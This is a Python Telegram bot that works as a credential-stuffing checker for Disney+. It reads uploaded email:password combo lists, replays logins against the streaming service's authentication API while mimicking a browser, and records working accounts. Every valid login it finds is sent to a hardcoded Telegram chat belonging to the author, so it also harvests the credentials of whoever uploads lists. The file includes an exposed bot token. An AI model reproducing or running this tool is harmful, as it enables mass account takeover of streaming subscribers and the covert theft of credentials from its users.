import requests
import telebot
from telebot import types

token = "6685119417:AAGGYkc1ztEbtILrx3VmY4i8_HgzwhqdRAI"  
CHAT_ID = '7142666518'  
bot = telebot.TeleBot(token, parse_mode="HTML")


def ahmed(file):
    hits = 0
    bad = 0

    with open(file, "r") as f:
        for line in f.read().splitlines():
            try:
                email, password = line.strip().split(":")
            except ValueError:
                print("\033[31m" + "Invalid format in line:" + line + "\033[0m")
                continue

            if not email or not password:
                print("\033[31m" + "Invalid email or password in line:" + line + "\033[0m")
                continue

            try:
                data = '{"deviceFamily":"browser","applicationRuntime":"chrome","deviceProfile":"windows","attributes":{}}'
                head = {
                    'content-type': 'application/json',
                    'accept': 'application/json; charset=utf-8',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
                    'cache-control': 'no-cache',
                    'content-length': '98',
                    'content-type': 'application/json; charset=UTF-8',
                    'origin': 'https://www.disneyplus.com',
                    'pragma': 'no-cache',
                    'referer': 'https://www.disneyplus.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
                    'x-bamsdk-client-id': 'disney-svod-3d9324fc',
                    'x-bamsdk-platform': 'windows',
                    'x-bamsdk-version': '4.16'
                }

                s = requests.Session()

                r = s.post('https://global.edge.bamgrid.com/devices', data=data, headers=head).json()['assertion']
                url1 = 'https://global.edge.bamgrid.com/token'
                data1 = 'grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=' + r + '&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice'
                head1 = {
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
                    'cache-control': 'no-cache',
                    'content-length': '98',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.disneyplus.com',
                    'pragma': 'no-cache',
                    'referer': 'https://www.disneyplus.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
                    'x-bamsdk-client-id': 'disney-svod-3d9324fc',
                    'x-bamsdk-platform': 'windows',
                    'x-bamsdk-version': '4.16'
                }

                r2 = s.post(url1, data=data1, headers=head1).json()['access_token']
                url2 = 'https://global.edge.bamgrid.com/idp/check'
                data2 = '{"email":"' + email + '"}'
                head2 = {
                    'content-type': 'application/json',
                    'accept': 'application/json; charset=utf-8',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': 'Bearer ' + r2 + '',
                    'cache-control': 'no-cache',
                    'content-length': '34',
                    'content-type': 'application/json; charset=UTF-8',
                    'origin': 'https://www.disneyplus.com',
                    'pragma': 'no-cache',
                    'referer': 'https://www.disneyplus.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
                    'x-bamsdk-client-id': 'disney-svod-3d9324fc',
                    'x-bamsdk-platform': 'windows',
                    'x-bamsdk-version': '4.16'
                }

                r3 = s.post(url2, data=data2, headers=head2).text

                if '"operations":["Login","OTP"]' in r3:
                    url3 = 'https://global.edge.bamgrid.com/idp/login'
                    data3 = '{"email":"' + email + '","password":"' + password + '"}'
                    head3 = {
                        'content-type': 'application/json',
                        'accept': 'application/json; charset=utf-8',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'authorization': 'Bearer ' + r2 + '',
                        'cache-control': 'no-cache',
                        'content-length': '34',
                        'content-type': 'application/json; charset=UTF-8',
                        'origin': 'https://www.disneyplus.com',
                        'pragma': 'no-cache',
                        'referer': 'https://www.disneyplus.com/',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'cross-site',
                        'sec-gpc': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
                        'x-bamsdk-client-id': 'disney-svod-3d9324fc',
                        'x-bamsdk-platform': 'windows',
                        'x-bamsdk-version': '4.16'
                    }
                    r4 = s.post(url3, data=data3, headers=head3).text
                    if 'id_token' in r4:
                        tlg = f'''HI New HIT DisznyPlus \n {email}:{password} | \n BY : @maho_s9'''
                        print("\033[32m" + tlg + "\033[0m")

                        
                        bot.send_message(chat_id=CHAT_ID, text=tlg)

                        with open('Diszny.txt', 'a') as x:
                            x.write(email + ":" + password + '\n' + tlg)

                    elif 'Invalid password' in r4:
                        print("\033[31m" + 'BAD Account >>' + email + "\033[0m")
                        bad += 1
                    elif 'Invalid email' in r4:
                        print("\033[31m" + f'Bad Gmail >> {email}' + "\033[0m")
                        bad += 1
                    else:
                        print("\033[31m" + f'Bad Gmail >> {email}' + "\033[0m")
                        bad += 1

            except Exception as e:
                print("\033[31m" + "Error:" + str(e) + "\033[0m")

    return hits, bad


@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "Send the file now \n ارسل الملف الان")


@bot.message_handler(content_types=["document"])
def main(message):
    hits, bad = 0, 0
    ko = bot.reply_to(message, "Checking Your Email...⌛").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)

    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", 'r') as f:
            lines = f.readlines()
            total = len(lines)
            for line in lines:
                password = line.split(":")[1]
                email = line.split(":")[0]

                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• Hits ✅ : [{hits}] •", callback_data='x')
                cm2 = types.InlineKeyboardButton(f"• Bad ❌ : [ {bad} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• المجموع : [ {total} ] •", callback_data='x')
                mes.add(cm1, cm2, cm5)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''يتم الفحص بواسطة بوت BY ➜ @maho_s9 ''', reply_markup=mes)

                hits, bad = ahmed("combo.txt")

    except Exception as e:
        print("Error:", e)


print('Done')
bot.infinity_polling()
